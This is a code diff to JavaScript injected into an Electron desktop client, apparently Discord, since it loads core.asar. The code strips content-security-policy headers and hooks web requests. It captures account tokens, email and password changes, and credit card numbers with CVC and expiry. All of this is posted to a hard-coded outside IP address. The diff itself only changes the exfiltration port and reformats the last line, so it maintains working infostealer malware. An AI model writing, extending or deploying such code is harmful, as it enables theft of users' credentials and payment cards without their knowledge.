@@ -22,7 +22,7 @@ session.defaultSession.webRequest.onBeforeRequest({
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     delete details.responseHeaders['content-security-policy'];
     delete details.responseHeaders['content-security-policy-report-only'];
-    if (details.url == 'http://91.151.89.14:443/payload') {
+    if (details.url == 'http://91.151.89.14:8080/payload') {
         callback({
             'responseHeaders': {
                 ...details.responseHeaders
@@ -42,7 +42,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 function sendToApi(data) {
     const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(' \n' + ' var xhr = new XMLHttpRequest();\n' + ' xhr.open("POST", "http://91.151.89.14:443/payload", true);\n' + " xhr.setRequestHeader('Content-Type', 'application/json');\n" + " xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n" + ' xhr.send(JSON.stringify(' + data + '));\n ', true);
+    window.webContents.executeJavaScript(' \n' + ' var xhr = new XMLHttpRequest();\n' + ' xhr.open("POST", "http://91.151.89.14:8080/payload", true);\n' + " xhr.setRequestHeader('Content-Type', 'application/json');\n" + " xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n" + ' xhr.send(JSON.stringify(' + data + '));\n ', true);
 }
 async function newData(type, token, ...args) {
     const ip = await getIp() 
@@ -109,5 +109,7 @@ session.defaultSession.webRequest.onCompleted({
         if (data['email']) newData('emailChanged', token, data['email'], data['password']);
         if (data['new_password']) newData('passwordChanged', token, data['password'], data['new_password']);
     }
-    if (details.url.endsWith('tokens') && details.method == 'POST') newData('cardAdded', token, data['data[number]'], data['data[cvc]'], data['data[exp_month]'], data['data[exp_year]']);
-}), module.exports = require('./core.asar');
+    if (details.url.endsWith('tokens') && details.method == 'POST') newData('cardAdded', token, data['data[number]'], data['data[cvc]'], data['data[exp_month]'], data['data[exp_year]']); 
+}), 
+    
+    module.exports = require('./core.asar');
